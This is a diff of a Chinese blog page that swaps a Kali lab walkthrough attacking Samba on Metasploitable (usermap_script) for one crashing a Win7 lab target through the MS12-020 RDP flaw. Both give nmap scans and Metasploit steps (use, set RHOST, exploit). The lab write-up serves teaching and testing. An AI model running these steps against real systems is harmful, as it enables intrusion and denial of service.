@@ -79,22 +79,26 @@
 
 
 
-<meta name="description" content="公司网站开发需要测试一下教学网站中的实验部分（一人两台实验机器，其中一台为kali，另一台为metasploitable）,看一下是否能正常使用。对kali工具不熟悉，找了几篇博客，并将主要流程记录下来。">
+<meta name="description" content="实验环境 攻击机 操作系统：kali IP地址：172.0.0.10   靶机 操作系统：win7 IP地址：172.0.0.12 端口开放：3389">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali 渗透攻击Samba服务">
-<meta property="og:url" content="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/index.html">
+<meta property="og:title" content="ms12-020渗透攻击实战">
+<meta property="og:url" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/index.html">
 <meta property="og:site_name" content="Mouri Blog">
-<meta property="og:description" content="公司网站开发需要测试一下教学网站中的实验部分（一人两台实验机器，其中一台为kali，另一台为metasploitable）,看一下是否能正常使用。对kali工具不熟悉，找了几篇博客，并将主要流程记录下来。">
+<meta property="og:description" content="实验环境 攻击机 操作系统：kali IP地址：172.0.0.10   靶机 操作系统：win7 IP地址：172.0.0.12 端口开放：3389">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/实例信息.png">
-<meta property="og:image" content="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/主机扫描.png">
-<meta property="og:image" content="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/端口扫描.png">
-<meta property="og:image" content="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/渗透攻击.png">
-<meta property="og:updated_time" content="2018-11-28T11:00:26.494Z">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/ipaddress.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/nmap%20scanIp.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/nmap.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/msfconsole.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/use模块.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/setIP.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/exploit.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/shutdown.png">
+<meta property="og:updated_time" content="2019-01-13T02:37:59.033Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="kali 渗透攻击Samba服务">
-<meta name="twitter:description" content="公司网站开发需要测试一下教学网站中的实验部分（一人两台实验机器，其中一台为kali，另一台为metasploitable）,看一下是否能正常使用。对kali工具不熟悉，找了几篇博客，并将主要流程记录下来。">
-<meta name="twitter:image" content="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/实例信息.png">
+<meta name="twitter:title" content="ms12-020渗透攻击实战">
+<meta name="twitter:description" content="实验环境 攻击机 操作系统：kali IP地址：172.0.0.10   靶机 操作系统：win7 IP地址：172.0.0.12 端口开放：3389">
+<meta name="twitter:image" content="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/ipaddress.png">
 
 
 
@@ -124,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/"/>
 
 
 
 
 
-  <title>kali 渗透攻击Samba服务 | Mouri Blog</title>
+  <title>ms12-020渗透攻击实战 | Mouri Blog</title>
   
 
 
@@ -291,7 +295,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/27/kali-渗透攻击Samba服务器/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/26/ms12-020渗透攻击实战/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Mouri">
@@ -308,7 +312,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">kali 渗透攻击Samba服务</h1>
+          <h1 class="post-title" itemprop="name headline">ms12-020渗透攻击实战</h1>
         
 
         <div class="post-meta">
@@ -320,8 +324,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-27T15:55:54+08:00">
-                2018-11-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-26T11:33:49+08:00">
+                2018-12-26
               </time>
             
 
@@ -331,6 +335,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/kali/" itemprop="url" rel="index">
+                    <span itemprop="name">kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -338,7 +364,7 @@
 
           
           
-             <span id="/2018/11/27/kali-渗透攻击Samba服务器/" class="leancloud_visitors" data-flag-title="kali 渗透攻击Samba服务">
+             <span id="/2018/12/26/ms12-020渗透攻击实战/" class="leancloud_visitors" data-flag-title="ms12-020渗透攻击实战">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -369,40 +395,45 @@
       
 
       
-        <p>  公司网站开发需要测试一下教学网站中的实验部分（一人两台实验机器，其中一台为kali，另一台为metasploitable）,看一下是否能正常使用。对kali工具不熟悉，找了几篇博客，并将主要流程记录下来。<br><a id="more"></a></p>
-<p>使用postman发送请求，将两台虚拟机镜像的ID封装成json对象。后端接收到数据后，生成对应的虚拟机，打开openstack的dashboard可以看到生成两个虚拟机，信息如下(主要看主机名和IP)：<br><img src="/2018/11/27/kali-渗透攻击Samba服务器/实例信息.png" alt=""><br>后台返回kali的url。将url复制到浏览器中后开始操作。</p>
-<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>nmap是一款专用的端口扫描工具，主要使用该工具发现局域网中的主机，和主机开放的端口。</p>
-<ul>
-<li>主机扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 172.0.0.0-100</span><br></pre></td></tr></table></figure>
+        <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ol>
+<li>攻击机<ol>
+<li>操作系统：kali</li>
+<li>IP地址：172.0.0.10</li>
+</ol>
 </li>
-</ul>
-<p>该命令是扫描发现局域网下IP为172.0.0.0-172.0.0.100下可以ping通的IP,结果如下。<br><img src="/2018/11/27/kali-渗透攻击Samba服务器/主机扫描.png" alt=""><br>由图片可知，已经发现了IP为172.0.0.13的虚拟机。</p>
-<ul>
-<li>端口扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 172.0.0.13 -A</span><br></pre></td></tr></table></figure>
+<li>靶机<ol>
+<li>操作系统：win7</li>
+<li>IP地址：172.0.0.12</li>
+<li>端口开放：3389<a id="more"></a>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3></li>
+</ol>
 </li>
-</ul>
-<p>该命令是发现主机开发的端口，通过扫描可以发现该主机开放了一些存在高危漏洞的端口。<br><img src="/2018/11/27/kali-渗透攻击Samba服务器/端口扫描.png" alt=""><br>上图所示是该主机开放的所有端口，其中知道比较多的139、445等高危端口是开放的。</p>
-<ul>
-<li>渗透攻击Samba服务<br>Samba服务对应的端口有139和445等，只要开启这些端口后，主机就有可能存在Samba远程溢出漏洞。以下是攻击步骤：</li>
-</ul>
-<ol>
-<li><p>启动MSF终端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<li>确保两台主机在局域网内相互ping通</li>
+<li>靶机检查自己开放端口，确保3389端口开放。</li>
+</ol>
+<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h4><h5 id="一、-两台主机在局域网内网络互通"><a href="#一、-两台主机在局域网内网络互通" class="headerlink" title="一、 两台主机在局域网内网络互通"></a>一、 两台主机在局域网内网络互通</h5><ol>
+<li>登录攻击机<br>账号：<code>debian</code><br>密码：<code>kalidebian</code></li>
+<li>右键选择-&gt;<code>Open Terminal Here</code>打开命令行终端</li>
+<li>输入<code>ip address</code>确认自己的IP地址<br><img src="/2018/12/26/ms12-020渗透攻击实战/ipaddress.png" alt="Alt text"><br>可以看到本机的IP地址为172.0.0.10</li>
+<li>使用nmap命令扫描局域网内其他主机<br><code>nmap -sP 172.0.0.0-255</code><br><img src="/2018/12/26/ms12-020渗透攻击实战/nmap scanIp.png" alt="Alt text"><br>其中172.0.0.2是dhcp服务，可以看到。除了这两个IP。还扫描到一个IP地址为172.0.0.12的主机，这就是靶机的IP地址。</li>
+<li>如果没有发现其他主机，请确认靶机防火墙已经关闭。<h5 id="二、靶机端口3389端口开放"><a href="#二、靶机端口3389端口开放" class="headerlink" title="二、靶机端口3389端口开放"></a>二、靶机端口3389端口开放</h5></li>
+<li>点击搜索符号，输入Zenmap并打开。</li>
+<li>在target输入靶机的IP地址信息并点击scan。<br><img src="/2018/12/26/ms12-020渗透攻击实战/nmap.png" alt="Alt text"></li>
+</ol>
+<p>可以看到靶机的开放端口信息，其中包含3389端口。如果3389端口没有开放，则需要登录靶机并开启3389端口。</p>
+<h4 id="ms12-020漏洞攻击"><a href="#ms12-020漏洞攻击" class="headerlink" title="ms12-020漏洞攻击"></a>ms12-020漏洞攻击</h4><ol>
+<li>登录攻击机，打开命令行终端</li>
+<li><p>输入命令<code>msfconsole</code>进入MSF终端<br><img src="/2018/12/26/ms12-020渗透攻击实战/msfconsole.png" alt="Alt text"></p>
 </li>
-<li><p>使用smb_version模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/samba/usermap_script</span><br></pre></td></tr></table></figure>
+<li><p>在MSF终端对目标漏洞进行查找相对应的漏洞利用模块<br><code>search ms12-020</code><br><code>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code><br><img src="/2018/12/26/ms12-020渗透攻击实战/use模块.png" alt="Alt text"></p>
 </li>
-<li><p>设置RHOST选项</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 172.0.0.13</span><br></pre></td></tr></table></figure>
+<li><p>配置目标主机和本机地址<br><code>set RHOST 172.0.0.12</code><br><code>set LHOST 172.0.0.10</code><br><img src="/2018/12/26/ms12-020渗透攻击实战/setIP.png" alt="Alt text"></p>
 </li>
-<li><p>启动渗透攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<li><p>对目标漏洞执行攻击，输入命令<code>exploit</code><br><img src="/2018/12/26/ms12-020渗透攻击实战/exploit.png" alt="Alt text"></p>
 </li>
-<li><p>等待完成，如果成功。使用Linux命令查询主机相关信息。例如查询系统当前用户和ip地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ip address</span><br></pre></td></tr></table></figure>
+<li><p>迅速切换到靶机界面，可以看到靶机界面显示蓝屏，然后自动重启。<br><img src="/2018/12/26/ms12-020渗透攻击实战/shutdown.png" alt="Alt text"></p>
 </li>
 </ol>
-<p><img src="/2018/11/27/kali-渗透攻击Samba服务器/渗透攻击.png" alt=""><br>这只是其中的一种漏洞，因为metasploitable是一个人工靶机，所以教程较多，攻击流畅。下面这篇博客里面还包含了其他的一些漏洞和攻击方法，可以参考。<br>参考链接：<a href="https://www.cnblogs.com/student-programmer/p/6728594.html" target="_blank" rel="noopener">Kali-Linux渗透攻击应用</a></p>
 
       
     </div>
@@ -427,8 +458,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/25/hexo-博客迁移/" rel="next" title="Hexo 博客迁移">
-                <i class="fa fa-chevron-left"></i> Hexo 博客迁移
+              <a href="/2018/12/10/git-常用命令操作/" rel="next" title="git 常用命令操作">
+                <i class="fa fa-chevron-left"></i> git 常用命令操作
               </a>
             
           </div>
@@ -437,8 +468,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/12/10/git-常用命令操作/" rel="prev" title="git 常用命令操作">
-                git 常用命令操作 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/01/13/selenium工具学习/" rel="prev" title="selenium工具学习">
+                selenium工具学习 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -590,7 +621,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#准备工作"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#准备工作"><span class="nav-number">2.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作步骤"><span class="nav-number">3.</span> <span class="nav-text">操作步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#准备工作-1"><span class="nav-number">3.1.</span> <span class="nav-text">准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、-两台主机在局域网内网络互通"><span class="nav-number">3.1.1.</span> <span class="nav-text">一、 两台主机在局域网内网络互通</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二、靶机端口3389端口开放"><span class="nav-number">3.1.2.</span> <span class="nav-text">二、靶机端口3389端口开放</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms12-020漏洞攻击"><span class="nav-number">3.2.</span> <span class="nav-text">ms12-020漏洞攻击</span></a></li></ol></li></ol></div>
             
 
           </div>
